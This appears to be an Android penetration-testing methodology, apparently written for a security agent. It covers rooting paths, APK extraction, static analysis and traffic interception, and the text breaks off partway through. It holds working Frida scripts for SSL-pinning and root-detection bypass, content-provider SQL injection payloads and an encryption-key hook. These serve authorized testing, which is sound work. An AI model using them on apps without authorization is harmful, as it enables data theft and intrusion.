# Android Penetration Testing Methodology: Rooted and Non-Rooted Approaches

**Status:** Operational | **Target Audience:** Security agent conducting Android app assessments
**Updated:** 2026-02-01 | **Framework Version:** 2.0

**🆕 2026 Update:** Drozer deprecated - Now using **APK Components Inspector**, **ADB commands**, **Frida scripts**, and **Objection** (actively maintained).

---

## Overview

Android penetration testing methodology covering both **rooted** (optimal) and **non-rooted** (common) testing approaches. Rooted testing provides 100% coverage with full system access, while non-rooted testing achieves 80-85% coverage—sufficient for identifying most application-level vulnerabilities.

**Key Advantage:** Unlike iOS, Android apps typically do NOT block rooted devices, and rooting is more accessible across device models and Android versions.

**Modern Tooling (2026):**
- ✅ **APK Components Inspector** - Automated component enumeration (replaces Drozer)
- ✅ **Pure ADB commands** - Direct component testing (no additional tools)
- ✅ **Frida + Objection** - Runtime manipulation (Jan 27, 2026 update)
- ✅ **MobSF v4.4.5** - Comprehensive automated analysis (Jan 26, 2026)

---

## Testing Environment Decision Tree

```
┌──────────────────────────────────────────────────────┐
│        ANDROID TESTING ENVIRONMENT SELECTION         │
└────────────────────┬─────────────────────────────────┘
                     │
                     ▼
          Do you have the APK file?
                     │
        ┌────────────┴────────────┐
        │                         │
       YES                       NO
        │                         │
        ▼                         ▼
  Physical device        Extract from device
  available?             or Play Store
        │                         │
   ┌────┴────┐                   │
   │         │                   │
  YES       NO                   │
   │         │                   │
   ▼         ▼                   ▼
Physical  Emulator         See: APK Extraction
Device     Only              Methods below
   │         │                   │
   ▼         └───────────────────┘
Can root?                        │
   │                             │
┌──┴──┐                          │
│     │                          │
YES  NO                          │
│     │                          │
▼     ▼                          ▼
┌────┐ ┌────┐              ┌─────────┐
│ A  │ │ B  │              │    C    │
└────┘ └────┘              └─────────┘


PATHS:
─────────────────────────────────────────────────────
A: Rooted Physical Device (OPTIMAL)
   ✅ Full system access
   ✅ 100% coverage
   ✅ Root filesystem browsable
   ✅ System-level hooking
   ✅ All testing techniques available

   Rooting Methods:
   • Magisk (most popular, systemless root)
   • KernelSU (modern alternative)
   • Custom ROM (LineageOS with root)

   → Use: ROOTED WORKFLOW below

─────────────────────────────────────────────────────
B: Non-Rooted Physical Device (COMMON)
   ✅ Production-realistic environment
   ✅ 80-85% coverage
   ✅ App-level testing possible
   ⚠️  Limited filesystem access
   ⚠️  Cannot hook system processes

   What's Still Possible:
   • Static analysis (100%)
   • Network interception (95%)
   • App-level Frida hooking (90%)
   • Data storage analysis (app sandbox only)
   • Certificate pinning bypass (90%)

   → Use: NON-ROOTED WORKFLOW below

─────────────────────────────────────────────────────
C: Android Emulator (ACCEPTABLE)
   ✅ Root access by default
   ✅ Easy snapshot/restore
   ✅ Good for automation
   ⚠️  Not production-realistic
   ⚠️  May miss device-specific issues

   Emulator Options:
   • Android Studio Emulator (free, root via adb)
   • Genymotion (commercial, better performance)
   • AWS Device Farm (cloud, real device images)

   → Use: EMULATOR WORKFLOW below
```

---

## APK Extraction Methods

### Method 1: Client-Provided APK

```bash
# Verify APK signature and package name
aapt dump badging app.apk | grep -E "package|versionCode|versionName"

# Extract and analyze structure
unzip -q app.apk -d app-extracted/
```

**Best case:** Client provides APK directly for authorized testing.

---

### Method 2: Extract from Physical Device (ADB)

**For Non-System Apps:**

```bash
# List installed packages
adb shell pm list packages | grep -i "targetapp"

# Get APK path
adb shell pm path com.example.targetapp
# Output: package:/data/app/com.example.targetapp-xxx/base.apk

# Pull APK from device
adb pull /data/app/com.example.targetapp-xxx/base.apk targetapp.apk
```

**For System Apps (Requires Root):**

```bash
# System apps are in /system/app/ or /system/priv-app/
adb shell su -c "cp /system/priv-app/TargetApp/TargetApp.apk /sdcard/"
adb pull /sdcard/TargetApp.apk
```

---

### Method 3: Download from Play Store

**Using APK Downloader Tools:**

```bash
# Option A: APKPure/APKMirror (web-based)
# Visit: https://www.apkpure.com/
# Search for app and download APK

# Option B: apkeep (command-line)
pip install apkeep
apkeep -a com.example.targetapp .

# Option C: gplaycli (requires Google account)
pip install gplaycli
gplaycli -d com.example.targetapp
```

**Using Device with Play Store Access:**

```bash
# Install app from Play Store on device
# Then extract using Method 2 (ADB pull)
```

**Reality Check:** Downloaded APKs from Play Store are encrypted with FairPlay DRM. You'll get the APK, but decompilation will show encrypted code. For full analysis, you need:
- Device installation → ADB pull (gets decrypted APK)
- OR root access to pull decrypted files

---

## Rooted Workflow (Optimal - 100% Coverage)

This is the **preferred method** when root access is available.

### Phase 1: EXPLORE

#### 1.1 APK Acquisition

```bash
# Extract APK from rooted device
adb shell su -c "pm path com.example.app"
adb shell su -c "cp /data/app/com.example.app-xxx/base.apk /sdcard/"
adb pull /sdcard/base.apk targetapp.apk

# Verify APK details
aapt dump badging targetapp.apk | grep -E "package|versionCode|permissions"
```

#### 1.2 Static Analysis with MobSF

```bash
# Deploy MobSF container (if not running)
ssh -p 2222 root@${VPS_IP} "docker compose up -d mobsf"

# Upload APK via API
curl -F "file=@targetapp.apk" http://${VPS_IP}:8000/api/v1/upload

# Scan APK
curl -X POST http://${VPS_IP}:8000/api/v1/scan \
  -d "scan_type=apk&file_name=targetapp.apk&hash=${HASH}"

# Download report
curl http://${VPS_IP}:8000/api/v1/report_json?hash=${HASH} > mobsf-report.json
```

**Key Findings from MobSF:**
- Exported components (Activities, Services, Receivers, Providers)
- Dangerous permissions requested
- Hardcoded secrets (API keys, URLs, credentials)
- Insecure crypto usage (DES, MD5, hardcoded keys)
- Debug mode enabled (`android:debuggable="true"`)
- Network security configuration
- Backup allowed without encryption

#### 1.3 AndroidManifest.xml Analysis

```bash
# Decompile APK with apktool
apktool d targetapp.apk -o targetapp-decompiled/

# Analyze manifest
cat targetapp-decompiled/AndroidManifest.xml

# Check for critical security issues:
# 1. Exported components without permissions
grep -E 'android:exported="true"' targetapp-decompiled/AndroidManifest.xml

# 2. Debuggable flag in production
grep 'android:debuggable="true"' targetapp-decompiled/AndroidManifest.xml

# 3. Backup enabled
grep 'android:allowBackup="true"' targetapp-decompiled/AndroidManifest.xml

# 4. Cleartext traffic allowed
grep -A5 'networkSecurityConfig' targetapp-decompiled/AndroidManifest.xml
```

**Security-Critical Manifest Settings:**

```xml
<!-- FINDINGS - Common misconfigurations -->

<!-- 1. Exported Activity without permission -->
<activity
    android:name=".AdminActivity"
    android:exported="true"/>
<!-- FINDING: Unauthorized access to admin functionality -->

<!-- 2. Debug mode in production -->
<application
    android:debuggable="true">
<!-- FINDING: Production app is debuggable (Critical) -->

<!-- 3. Backup enabled without encryption -->
<application
    android:allowBackup="true">
<!-- FINDING: Sensitive data in unencrypted backups -->

<!-- 4. Cleartext traffic allowed -->
<application
    android:networkSecurityConfig="@xml/network_security_config">

<!-- In res/xml/network_security_config.xml: -->
<network-security-config>
    <base-config cleartextTrafficPermitted="true">
<!-- FINDING: HTTP traffic allowed (credentials over cleartext) -->
```

#### 1.4 Decompile to Java Source

```bash
# Decompile APK to Java with JADX
jadx targetapp.apk -d jadx-output/

# Search for hardcoded secrets
grep -r "api_key\|password\|secret\|token\|private_key" jadx-output/sources/ | head -20

# Find crypto implementations
grep -r "DES\|ECB\|MD5\|SHA1" jadx-output/sources/ | grep -v "SHA256\|SHA512"

# Identify authentication logic
grep -r "login\|authenticate" jadx-output/sources/ | grep -i "method\|function"
```

**Example Finding - Hardcoded API Key:**

```java
// jadx-output/sources/com/example/app/ApiClient.java
public class ApiClient {
    private static final String API_KEY = "sk_live_51HAbC123456789..."; // CRITICAL
    private static final String API_URL = "http://api.example.com"; // HTTP!

    public static Response makeRequest(String endpoint, String data) {
        // Cleartext HTTP with hardcoded API key
        return httpClient.post(API_URL + endpoint, data, API_KEY);
    }
}
```

**Gate:** Attack surface mapped → Proceed to PLAN

---

### Phase 2: PLAN

Generate Android-specific test plan mapped to OWASP MASTG.

**Test Plan Structure:**

```markdown
# Android Test Plan: [App Name]

## Scope
- Package: com.example.targetapp
- Version: 1.2.3 (versionCode: 123)
- Android Target: 11+ (API 30+)
- Environment: Rooted Pixel 8 (Android 14)

## MASVS-STORAGE (Data Storage) - 16 tests
| ID | Test Case | Method | Tool | Priority | Root Required |
|----|-----------|--------|------|----------|---------------|
| TC-ST-01 | Sensitive data in SharedPreferences | Static + Dynamic | ADB, MobSF | High | No |
| TC-ST-02 | SQLite database encryption | Dynamic | SQLite Browser | High | No |
| TC-ST-03 | External storage files | Dynamic | ADB | High | No |
| TC-ST-04 | Logcat sensitive data | Dynamic | ADB logcat | High | No |
| TC-ST-05 | App data backup extraction | Dynamic | ADB backup | Medium | No |

## MASVS-NETWORK (Network Communication) - 12 tests
| ID | Test Case | Method | Tool | Priority | Root Required |
|----|-----------|--------|------|----------|---------------|
| TC-NET-01 | Cleartext HTTP traffic | Dynamic | Reaper/mitmproxy | Critical | No |
| TC-NET-02 | Certificate pinning bypass | Dynamic | Frida | High | No |
| TC-NET-03 | Network security config | Static | AndroidManifest | High | No |
| TC-NET-04 | TLS version and ciphers | Dynamic | Reaper/mitmproxy | High | No |

## MASVS-PLATFORM (Platform Integration) - 14 tests
| ID | Test Case | Method | Tool | Priority | Root Required |
|----|-----------|--------|------|----------|---------------|
| TC-PLAT-01 | Exported Activity access | Dynamic | ADB, Drozer | Critical | No |
| TC-PLAT-02 | Exported Service abuse | Dynamic | Drozer | High | No |
| TC-PLAT-03 | Content Provider SQL injection | Dynamic | Drozer | Critical | No |
| TC-PLAT-04 | Broadcast Receiver injection | Dynamic | Drozer | High | No |
| TC-PLAT-05 | Intent redirection | Dynamic | ADB | Medium | No |
| TC-PLAT-06 | Deep link exploitation | Dynamic | ADB | High | No |
| TC-PLAT-07 | WebView vulnerabilities | Dynamic | Manual | High | No |

## MASVS-CRYPTO (Cryptography) - 10 tests
## MASVS-AUTH (Authentication) - 8 tests
## MASVS-CODE (Code Quality) - 7 tests
## MASVS-RESILIENCE (Anti-Reverse Engineering) - 5 tests

## Tools Required
✅ MobSF (static analysis) - mobile-security container
✅ Frida + Objection (runtime) - device + macOS/Linux
✅ Reaper (proxy), mitmproxy, or OWASP ZAP - HTTP proxy
✅ JADX (decompiler) - local or container
✅ APKTool (resource extraction) - local or container
✅ APK Components Inspector (IPC enumeration) - replaces deprecated Drozer
✅ ADB (device interaction) - local Android SDK

## Rooted Device Advantages
✅ System app access
✅ Root filesystem browsing
✅ Install Frida as system service
✅ SSL pinning bypass via system CA
✅ Memory dumps of other processes
✅ Kernel-level analysis (if needed)

## ⚠️ APPROVAL REQUIRED
[ ] Scope confirmed - authorized to test this app
[ ] APK obtained legally (client-provided OR authorized extraction)
[ ] Rooted device prepared with all tools
[ ] Approved to proceed with testing
```

**Template:** `skills/pentest/templates/test-plan-android.md`

**Gate:** ⛔ **TEST PLAN APPROVAL REQUIRED** → Proceed to CODE

---

### Phase 3: CODE (Execution)

#### 3.1 Device Setup (Rooted)

```bash
# Verify root access
adb shell su -c "id"
# Output: uid=0(root) gid=0(root) ...

# Install Frida server (rooted device)
# Download Frida server for Android ARM64
wget https://github.com/frida/frida/releases/download/16.1.10/frida-server-16.1.10-android-arm64.xz
unxz frida-server-16.1.10-android-arm64.xz

# Push to device and set permissions
adb push frida-server-16.1.10-android-arm64 /data/local/tmp/frida-server
adb shell su -c "chmod 755 /data/local/tmp/frida-server"

# Start Frida server as root
adb shell su -c "/data/local/tmp/frida-server &"

# Verify Frida is running
frida-ps -U
# Should list device processes
```

#### 3.2 Static Analysis Deep Dive

**Hardcoded Secrets Detection:**

```bash
# Search decompiled source for secrets
cd jadx-output/sources/

# API keys
grep -r "api[_-]key\|apikey\|API_KEY" . | grep -v "[insert your API key]"

# AWS credentials
grep -r "AKIA[0-9A-Z]{16}" .

# Private keys
grep -r "BEGIN.*PRIVATE KEY" .

# Passwords
grep -r "password.*=.*\"" . | grep -v "password_field\|password_hint"

# Tokens
grep -r "bearer\|jwt\|token.*=.*\"" . | grep -iv "auth_token_field"
```

**Insecure Crypto Detection:**

```bash
# Weak algorithms
grep -r "Cipher.getInstance" . | grep -E "DES|ECB"

# Hardcoded encryption keys
grep -r "SecretKeySpec\|KeySpec" . -A3 | grep "new byte"

# Insecure random
grep -r "Random()" . | grep -v "SecureRandom"

# MD5/SHA1 for security purposes
grep -r "MessageDigest.getInstance" . | grep -E "MD5|SHA-1"
```

#### 3.3 Dynamic Analysis - Network Traffic

**Setup Reaper Proxy (Primary Method):**

```bash
# 1. Start Reaper container
ssh -p 2222 root@${VPS_IP} "docker compose up -d reaper"

# 2. Export Reaper certificate
./tools/pentest/export-proxy-cert.sh reaper

# 3. Install certificate on Android device
# Transfer cert to device
adb push reaper-ca-cert.pem /sdcard/Download/

# Install as user certificate (Android 7-13)
# Settings → Security → Install from storage → CA certificate

# For Android 7+ system trust (requires root):
# Convert PEM to DER format with proper hash
openssl x509 -inform PEM -subject_hash_old -in reaper-ca-cert.pem | head -1
# Output: 9a5ba575

# Push to system CA store
adb push reaper-ca-cert.pem /sdcard/9a5ba575.0
adb shell su -c "mount -o rw,remount /system"
adb shell su -c "cp /sdcard/9a5ba575.0 /system/etc/security/cacerts/"
adb shell su -c "chmod 644 /system/etc/security/cacerts/9a5ba575.0"
adb shell su -c "mount -o ro,remount /system"
adb reboot

# 4. Configure device proxy
# Settings → Wi-Fi → Long press network → Modify → Advanced
# Proxy: Manual
# Hostname: reaper-api.internal (via Twingate) OR VPS IP
# Port: 8080

# 5. Capture traffic
# Use app normally - all HTTPS traffic captured to reaper.db

# 6. Query captured traffic
ssh -p 2222 root@${VPS_IP} \
  "sqlite3 /opt/pentest-data/reaper.db \
  \"SELECT DISTINCT host FROM requests WHERE host LIKE '%targetapp.com%'\""

# 7. Extract API endpoints
ssh -p 2222 root@${VPS_IP} \
  "sqlite3 /opt/pentest-data/reaper.db \
  \"SELECT method, url, status_code FROM requests
   WHERE host LIKE '%api.targetapp.com%'
   ORDER BY timestamp DESC LIMIT 20\""
```

**SSL Pinning Bypass (If Needed):**

```bash
# Use Objection (Frida-based)
objection -g com.example.targetapp explore

# Inside Objection:
android sslpinning disable

# App should now allow proxy interception
```

**Alternative: Frida Script for SSL Bypass:**

```javascript
// ssl-bypass-android.js
Java.perform(function() {
    console.log("[+] Android SSL Pinning Bypass");

    // OkHttp3 CertificatePinner bypass
    try {
        var CertificatePinner = Java.use('okhttp3.CertificatePinner');
        CertificatePinner.check.overload('java.lang.String', 'java.util.List').implementation = function() {
            console.log('[+] OkHttp3 CertificatePinner.check bypassed');
            return;
        };
    } catch(e) {
        console.log('[-] OkHttp3 not found');
    }

    // TrustManager bypass (Android)
    try {
        var TrustManagerImpl = Java.use('com.android.org.conscrypt.TrustManagerImpl');
        TrustManagerImpl.verifyChain.implementation = function() {
            console.log('[+] TrustManagerImpl.verifyChain bypassed');
            return this.getTrustedChainForServer();
        };
    } catch(e) {
        console.log('[-] TrustManagerImpl not found');
    }

    // SSLContext bypass
    try {
        var SSLContext = Java.use('javax.net.ssl.SSLContext');
        SSLContext.init.overload('[Ljavax.net.ssl.KeyManager;', '[Ljavax.net.ssl.TrustManager;', 'java.security.SecureRandom').implementation = function(km, tm, sr) {
            console.log('[+] SSLContext.init bypassed');
            this.init(km, tm, sr);
        };
    } catch(e) {}

    console.log("[+] SSL Pinning bypass loaded");
});
```

**Execute:**
```bash
frida -U -f com.example.targetapp -l ssl-bypass-android.js --no-pause
```

#### 3.4 Data Storage Analysis (Rooted)

**App Data Directory Access:**

```bash
# Navigate to app data (root required)
adb shell su -c "ls -la /data/data/com.example.targetapp/"

# Output shows:
# drwx------ com.example.targetapp com.example.targetapp  cache/
# drwx------ com.example.targetapp com.example.targetapp  databases/
# drwx------ com.example.targetapp com.example.targetapp  files/
# drwx------ com.example.targetapp com.example.targetapp  shared_prefs/
```

**SharedPreferences Analysis:**

```bash
# Pull SharedPreferences files
adb shell su -c "cp -r /data/data/com.example.targetapp/shared_prefs /sdcard/"
adb pull /sdcard/shared_prefs ./

# Examine preference files
cat shared_prefs/com.example.targetapp_preferences.xml

# Look for:
# - Auth tokens
# - API keys
# - Passwords
# - Session IDs
# - User PII
```

**Example Finding - Token in SharedPreferences:**

```xml
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <string name="auth_token">Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...</string>
    <string name="user_password">plaintextPassword123</string>
    <boolean name="is_logged_in" value="true" />
</map>
```

**FINDING:** Sensitive authentication tokens and plaintext password stored in SharedPreferences (MASVS-STORAGE-1, Critical)

**SQLite Database Analysis:**

```bash
# Pull databases
adb shell su -c "cp -r /data/data/com.example.targetapp/databases /sdcard/"
adb pull /sdcard/databases ./

# List database files
ls databases/
# userdata.db
# cache.db

# Analyze with sqlite3
sqlite3 databases/userdata.db

sqlite> .tables
users  sessions  credit_cards

sqlite> SELECT * FROM users;
1|admin|admin@example.com|5f4dcc3b5aa765d61d8327deb882cf99|1

sqlite> SELECT * FROM credit_cards;
1|1234-5678-9012-3456|12/25|123
```

**FINDING:**
- User passwords stored as MD5 hashes (weak, rainbow table attack)
- Credit card data stored in plaintext
- No database encryption (MASVS-STORAGE-1, Critical)

**Logcat Analysis:**

```bash
# Monitor logs for sensitive data
adb logcat | grep -i "password\|token\|api\|secret\|credit"

# Common findings:
# - Passwords logged during authentication
# - API responses with sensitive data
# - Crash logs with stack traces containing secrets
```

#### 3.5 Component Testing (Modern Approach - No Drozer)

**Note:** Drozer is deprecated and incompatible with Android 12+. Modern component testing uses **APK Components Inspector**, **ADB commands**, and **Frida scripts**.

---

**Method 1: APK Components Inspector (Automated)**

APK Components Inspector is the modern replacement for Drozer's component enumeration.

```bash
# Install APK Components Inspector
git clone https://github.com/thecybersandeep/apk-components-inspector
cd apk-components-inspector
python3 -m venv venv
source venv/bin/activate
pip install androguard==3.3.5 rich

# Run automated component extraction
python apk-components-inspector.py /path/to/targetapp.apk

# Output: Generates ready-to-use ADB commands for each component
# Example output:
# [EXPORTED ACTIVITY] com.example.AdminActivity
#   ADB Command: adb shell am start -n com.example.targetapp/.AdminActivity --es "user_id" "1"
```

**Advantages:**
- Automates ~74% of component testing
- Extracts real parameter names from Smali code
- Generates copy-paste ADB commands
- No device connection needed for static analysis

---

**Method 2: Pure ADB Commands (Manual)**

All Drozer functionality can be replicated with ADB commands:

**A) List Exported Components:**

```bash
# Get attack surface overview
adb shell dumpsys package com.example.targetapp | grep -E "Activity|Service|Receiver|Provider" | grep "exported=true"

# More detailed manifest dump
adb shell pm dump com.example.targetapp > package_dump.txt
grep "exported=true" package_dump.txt
```

**B) Launch Exported Activity:**

```bash
# Simple launch
adb shell am start -n com.example.targetapp/.AdminActivity

# With intent extras (parameters)
adb shell am start -n com.example.targetapp/.AdminActivity \
  --es "user_id" "1337" \
  --ei "role" 1 \
  --ez "is_admin" true
```

**Example Finding - Exported Activity:**

```markdown
FINDING: Unauthorized Access to Admin Functionality

Test: Launched AdminActivity via ADB
Command: adb shell am start -n com.example.targetapp/.AdminActivity

Result: Admin panel displayed without authentication

Proof of Concept:
1. No app installation needed (ADB from any source)
2. adb shell am start -n com.example.targetapp/.AdminActivity
3. Admin interface accessible

Impact:
- Any app can launch admin functionality via Intent
- No authentication check enforced
- MASVS-PLATFORM-2 violation (Sensitive Functionality Exposure Through IPC)

CVSS: 8.5 (High)
Remediation: Add permission check or set android:exported="false"
```

**C) Test Services:**

```bash
# List services
adb shell dumpsys package com.example.targetapp | grep -A 5 "Service"

# Start exported service
adb shell am startservice -n com.example.targetapp/.BackupService \
  --es "backup_path" "/sdcard/stolen_data/"
```

**D) Send Broadcast:**

```bash
# Send broadcast to exported receiver
adb shell am broadcast -a com.example.targetapp.ADMIN_ACTION \
  --es "command" "delete_all_users"

# Targeted broadcast
adb shell am broadcast -n com.example.targetapp/.AdminReceiver \
  -a com.example.ACTION \
  --es "redirect_intent" "intent:#Intent;component=com.example/.Internal;end"
```

**E) Query Content Provider:**

```bash
# Basic query
adb shell content query --uri content://com.example.targetapp.provider/users

# Query with projection
adb shell content query \
  --uri content://com.example.targetapp.provider/users \
  --projection id:username:email

# Insert data
adb shell content insert \
  --uri content://com.example.targetapp.provider/users \
  --bind username:s:"hacker" \
  --bind email:s:"hacker@example.com"
```

**F) Test Content Provider SQL Injection:**

```bash
# SQL Injection Test Script
#!/bin/bash
PROVIDER_URI="content://com.example.targetapp.provider/users"

echo "[*] Testing Content Provider SQL Injection"

# Test 1: Projection parameter (table enumeration)
echo "[+] Test 1: Projection SQLi"
adb shell content query --uri "$PROVIDER_URI" \
  --projection "* FROM sqlite_master WHERE type='table'"

# Test 2: Sort parameter (blind SQLi)
echo "[+] Test 2: Sort Order SQLi"
adb shell content query --uri "$PROVIDER_URI" \
  --sort "_id LIMIT (SELECT 1 FROM sqlite_master)"

# Test 3: Selection parameter (Boolean SQLi)
echo "[+] Test 3: Selection SQLi"
adb shell content query --uri "$PROVIDER_URI" \
  --where "1=1 OR 1=1--"

# Test 4: Union-based SQLi (data extraction)
echo "[+] Test 4: Union-based SQLi"
adb shell content query --uri "$PROVIDER_URI" \
  --projection "name FROM sqlite_master UNION SELECT password FROM users--"
```

**If SQL injection successful:**

```markdown
FINDING: SQL Injection in Content Provider

Component: com.example.targetapp.provider.UserProvider
URI: content://com.example.targetapp.provider/users

Vulnerable Parameter: projection

Proof of Concept:
adb shell content query \
  --uri content://com.example.targetapp.provider/users \
  --projection "* FROM sqlite_master WHERE type='table'"

Result:
sqlite_master table disclosed:
- users
- sessions
- credit_cards
- passwords

Impact:
- Full database access via SQL injection
- Sensitive tables exposed (credit_cards, passwords)
- MASVS-PLATFORM-2 violation (CWE-89: SQL Injection)

CVSS: 9.1 (Critical)
Remediation: Use parameterized queries, validate all inputs
```

---

**Method 3: Frida Scripts (Runtime Monitoring)**

For advanced component testing, use Frida scripts to monitor runtime behavior.

**A) Discover Exported Components (Runtime):**

```javascript
// Save as: discover_components.js
Java.perform(function() {
    var context = Java.use("android.app.ActivityThread")
        .currentApplication()
        .getApplicationContext();
    var packageName = context.getPackageName();
    var pm = context.getPackageManager();

    var packageInfo = pm.getPackageInfo(packageName, 0x0F);

    console.log("[*] Package: " + packageName);

    // Activities
    console.log("\n[+] Exported Activities:");
    if (packageInfo.activities.value != null) {
        packageInfo.activities.value.forEach(function(activity) {
            if (activity.exported.value) {
                console.log("  - " + activity.name.value);
            }
        });
    }

    // Services
    console.log("\n[+] Exported Services:");
    if (packageInfo.services.value != null) {
        packageInfo.services.value.forEach(function(service) {
            if (service.exported.value) {
                console.log("  - " + service.name.value);
            }
        });
    }

    // Receivers
    console.log("\n[+] Exported Receivers:");
    if (packageInfo.receivers.value != null) {
        packageInfo.receivers.value.forEach(function(receiver) {
            if (receiver.exported.value) {
                console.log("  - " + receiver.name.value);
            }
        });
    }

    // Providers
    console.log("\n[+] Exported Providers:");
    if (packageInfo.providers.value != null) {
        packageInfo.providers.value.forEach(function(provider) {
            if (provider.exported.value) {
                console.log("  - " + provider.name.value);
                console.log("    Authority: " + provider.authority.value);
            }
        });
    }
});
```

**Usage:**
```bash
frida -U -f com.example.targetapp -l discover_components.js --no-pause
```

**B) Monitor Content Provider Queries:**

```javascript
// Save as: provider_monitor.js
Java.perform(function() {
    var ContentProvider = Java.use("android.content.ContentProvider");

    ContentProvider.query.overload('android.net.Uri', '[Ljava.lang.String;', 'java.lang.String', '[Ljava.lang.String;', 'java.lang.String').implementation = function(uri, projection, selection, selectionArgs, sortOrder) {
        console.log("[*] ContentProvider.query");
        console.log("  URI: " + uri.toString());
        console.log("  Projection: " + projection);
        console.log("  Selection: " + selection);
        console.log("  SelectionArgs: " + selectionArgs);
        console.log("  SortOrder: " + sortOrder);

        return this.query(uri, projection, selection, selectionArgs, sortOrder);
    };

    console.log("[*] ContentProvider query monitor loaded");
});
```

**C) Intent Logger:**

```javascript
// Save as: intent_logger.js
Java.perform(function() {
    var Activity = Java.use("android.app.Activity");

    Activity.startActivity.overload('android.content.Intent').implementation = function(intent) {
        console.log("[*] Intent Launched");
        console.log("  Action: " + intent.getAction());
        console.log("  Component: " + intent.getComponent());

        var extras = intent.getExtras();
        if (extras != null) {
            console.log("  Extras:");
            var keys = extras.keySet().iterator();
            while (keys.hasNext()) {
                var key = keys.next();
                console.log("    " + key + " = " + extras.get(key));
            }
        }

        return this.startActivity(intent);
    };

    console.log("[*] Intent logger loaded");
});
```

---

**Method 4: Objection (Frida-Based Framework)**

Objection provides simplified component testing commands.

```bash
# Start Objection
objection -g com.example.targetapp explore

# Inside Objection REPL:

# List activities
android hooking list activities

# Launch activity
android intent launch_activity com.example.AdminActivity

# Launch service
android intent launch_service com.example.BackupService
```

**Advantages:**
- No root required
- Built-in SSL pinning bypass
- Actively maintained (Jan 27, 2026 update)
- Easy-to-use REPL interface

---

**Deep Link Testing:**

```bash
# Test custom URL scheme
adb shell am start -W -a android.intent.action.VIEW \
  -d "targetapp://admin?bypass=true&user_id=1337"

# Test App Links (https://)
adb shell am start -a android.intent.action.VIEW \
  -d "https://example.com/admin?token=stolen_token"

# Verify App Links configuration
adb shell pm get-app-links com.example.targetapp
```

**FINDING Template - Deep Link Vulnerability:**

```markdown
FINDING: Authentication Bypass via Deep Link

Vulnerable Component: MainActivity
Deep Link: targetapp://admin

Proof of Concept:
adb shell am start -a android.intent.action.VIEW \
  -d "targetapp://admin?bypass_auth=true"

Result: Admin panel accessible without authentication

Impact:
- Malicious app can open admin interface
- Deep link parameter "bypass_auth" not validated
- MASVS-PLATFORM-1 violation (CWE-926: Intent Redirection)

CVSS: 7.8 (High)
Remediation: Validate all deep link parameters, enforce authentication
```

#### 3.6 Runtime Manipulation (Frida)

**Root Detection Bypass:**

```javascript
// root-bypass-android.js
Java.perform(function() {
    console.log("[+] Android Root Detection Bypass");

    // Common root detection library: RootBeer
    try {
        var RootBeer = Java.use('com.scottyab.rootbeer.RootBeer');
        RootBeer.isRooted.implementation = function() {
            console.log('[+] RootBeer.isRooted bypassed');
            return false;
        };
        RootBeer.isRootedWithoutBusyBoxCheck.implementation = function() {
            return false;
        };
    } catch(e) {}

    // File-based root detection
    var File = Java.use('java.io.File');
    File.exists.implementation = function() {
        var name = this.getName();
        if (name == "su" || name == "magisk" || name == "Superuser.apk") {
            console.log('[+] Hiding root file: ' + name);
            return false;
        }
        return this.exists.call(this);
    };

    // Runtime.exec checks for su
    var Runtime = Java.use('java.lang.Runtime');
    Runtime.exec.overload('java.lang.String').implementation = function(cmd) {
        if (cmd.includes('su') || cmd.includes('which su')) {
            console.log('[+] Blocked su check: ' + cmd);
            throw new Error('Command not found');
        }
        return this.exec(cmd);
    };

    console.log("[+] Root detection bypass loaded");
});
```

**Method Hooking (Extract Encryption Key):**

```javascript
// hook-crypto-android.js
Java.perform(function() {
    var SecretKeySpec = Java.use('javax.crypto.spec.SecretKeySpec');

    SecretKeySpec.$init.overload('[B', 'java.lang.String').implementation = function(key, algorithm) {
        console.log('[+] Encryption Key: ' + bytesToHex(key));
        console.log('[+] Algorithm: ' + algorithm);
        return this.$init(key, algorithm);
    };

    function bytesToHex(bytes) {
        var hex = '';
        for (var i = 0; i < bytes.length; i++) {
            hex += ('0' + (bytes[i] & 0xFF).toString(16)).slice(-2);
        }
        return hex;
    }
});
```

**Execute:**
```bash
frida -U -f com.example.targetapp -l hook-crypto-android.js --no-pause
```

**Gate:** All test cases executed, findings documented → Proceed to QA

---

### Phase 4: QA

**Android-Specific Validation Checklist:**

- [ ] Can finding be reproduced on **non-rooted** device? (If no, note in report)
- [ ] Evidence includes Android version (e.g., Android 14)
- [ ] Evidence includes device model (e.g., Pixel 8)
- [ ] Steps work with **Play Store build** (not debug/development)
- [ ] CVSS score accounts for root requirement (reduce score if root needed)
- [ ] MASVS category correctly mapped
- [ ] Remediation tested on actual Android app
- [ ] All exported components tested for authorization
- [ ] Proof-of-concept scripts included (Frida, Drozer commands)

**Gate:** All findings validated → Proceed to COMMIT

---

### Phase 5: COMMIT

**Path A: Self-Hosted Internal App**
- Handoff to engineering team with Android Studio project access
- Provide Java/Kotlin code locations
- Include unit test cases for verification
- Re-test after fixes deployed via internal distribution

**Path B: Bug Bounty Submission**
- Format for HackerOne/Bugcrowd
- Include video PoC (screen recording with ADB screen capture)
- Note if root required for exploitation (affects severity)
- Attach Frida scripts, Drozer commands, screenshots

**Path C: Client Consulting**
- Generate professional pentest report
- Executive summary with Android security posture rating
- Remediation roadmap prioritized by MASVS category

**Templates:**
- `skills/pentest/templates/finding-android.md`
- `skills/pentest/templates/report-android.md`
- `skills/pentest/templates/bug-bounty-submission-android.md`

---

## Non-Rooted Workflow (Common - 80-85% Coverage)

When root access is not available, most app-level testing is still possible.

### What's Still Testable (Non-Rooted):

✅ **Static Analysis** - 100% coverage
- APK decompilation
- Manifest analysis
- Hardcoded secrets detection
- Binary analysis

✅ **Network Traffic** - 95% coverage
- Proxy configuration (user CA trust)
- SSL pinning bypass (Frida)
- API testing

✅ **App-Level Runtime** - 90% coverage
- Frida hooking (app processes only)
- Objection framework
- Method tracing
- Root detection bypass

✅ **Data Storage (App Sandbox)** - 85% coverage
- SharedPreferences (via app backup)
- Databases (via app backup)
- Internal storage (via app backup)

✅ **Component Testing** - 70% coverage
- Exported component testing (ADB)
- Deep link testing
- Intent fuzzing (limited)

### What's NOT Testable (Non-Rooted):

❌ System-level filesystem access
❌ System process hooking
❌ Other app data access
❌ System CA certificate installation (Android 7+)
❌ Protected memory dumps

### Non-Rooted Setup:

```bash
# 1. Enable USB debugging (no root needed)
# Settings → Developer Options → USB Debugging

# 2. Install Frida (cannot run as system service)
# Frida must be injected per-app or use Frida gadget

# 3. Certificate for Android 7+ (User CA not trusted by default)
# Option A: App repackaging with network_security_config
# Option B: Frida SSL bypass (no system changes needed)

# 4. Extract app data via backup
